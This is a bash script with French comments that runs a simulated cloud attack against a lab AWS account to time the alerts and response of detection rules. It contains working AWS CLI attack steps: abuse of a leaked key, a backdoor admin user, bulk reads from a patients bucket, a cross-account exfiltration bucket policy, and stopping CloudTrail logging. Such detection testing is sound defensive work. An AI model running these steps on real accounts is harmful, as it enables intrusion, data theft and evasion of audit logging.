#!/usr/bin/env bash
# Scénario complet : clé d'un développeur fuitée -> reconnaissance -> escalade ->
# exfiltration -> effacement des traces. Journalise l'heure de chaque étape dans
# attacks/raw/<run>.jsonl pour calculer le MTTD / MTTR ensuite.
# Pas encore exécuté : aucun résultat publié tant que le scénario n'a pas été rejoué.
# Usage : AWS_PROFILE=lab-admin ADL_ACCOUNT_ID=... CONFIRM_LAB=yes attacks/scenario.sh
source "$(dirname "$0")/lib.sh"

project="${ADL_PROJECT:-adl}"
dev_user="dev-${project}"
bucket="${project}-patients-${ADL_ACCOUNT_ID}"
trail="${project}-trail"
run="$(date -u +%Y%m%dT%H%M%SZ)-scenario"
backdoor_user="backdoor-${run: -6}"
assert_lab_account

key_json="$(aws iam create-access-key --user-name "$dev_user")"   # étape 0 : "la fuite"
key_id="$(jq -r .AccessKey.AccessKeyId <<<"$key_json")"
secret="$(jq -r .AccessKey.SecretAccessKey <<<"$key_json")"
as_dev() { env -u AWS_PROFILE -u AWS_SESSION_TOKEN AWS_ACCESS_KEY_ID="$key_id" AWS_SECRET_ACCESS_KEY="$secret" "$@"; }

cleanup() {
  # remise en état : tout ce que le scénario a créé, avec les droits admin (pas ceux de dev)
  aws iam detach-user-policy --user-name "$backdoor_user" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess 2>/dev/null || true
  aws iam delete-user --user-name "$backdoor_user" 2>/dev/null || true
  aws iam delete-access-key --user-name "$dev_user" --access-key-id "$key_id" 2>/dev/null || true
  aws cloudtrail start-logging --name "$trail" 2>/dev/null || true
  log_step "$run" scenario cleanup
}
trap cleanup EXIT

echo "Propagation de la clé..."; sleep 15

log_step "$run" recon start                                             # 1. reconnaissance
as_dev aws sts get-caller-identity >/dev/null
as_dev aws s3api list-buckets >/dev/null
as_dev aws iam list-users >/dev/null
as_dev aws ec2 describe-instances --region "$AWS_REGION" >/dev/null

log_step "$run" privesc start                                           # 2. escalade (règle 001)
as_dev aws iam create-user --user-name "$backdoor_user" >/dev/null
as_dev aws iam attach-user-policy --user-name "$backdoor_user" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

log_step "$run" exfil-read start                                        # 3. lecture massive (règles 006, 007)
as_dev aws s3api list-objects-v2 --bucket "$bucket" --max-items 500 --query 'Contents[].Key' --output text \
  | tr '\t' '\n' | while read -r obj; do as_dev aws s3api get-object --bucket "$bucket" --key "$obj" /dev/null >/dev/null; done

log_step "$run" exfil-policy start                                      # 4. porte dérobée (règle 005)
backdoor_policy="$(mktemp)"
cat > "$backdoor_policy" <<POLICY
{"Version":"2012-10-17","Statement":[{"Sid":"Backdoor","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ADL_BACKDOOR_ACCOUNT:-999988887777}:root"},"Action":"s3:GetObject","Resource":"arn:aws:s3:::${bucket}/*"}]}
POLICY
as_dev aws s3api put-bucket-policy --bucket "$bucket" --policy "file://$backdoor_policy" || echo "(refusé : dev n'a pas s3:PutBucketPolicy ? voir le résultat dans runs.md)"
rm -f "$backdoor_policy"

log_step "$run" cover-tracks start                                      # 5. effacement des traces (règle 003)
as_dev aws cloudtrail stop-logging --name "$trail" || echo "(refusé : dev n'a pas cloudtrail:StopLogging)"
log_step "$run" scenario end
echo "Scénario terminé : relever les heures des alertes Discord et la réponse automatique."
echo "Journal : attacks/raw/$run.jsonl"
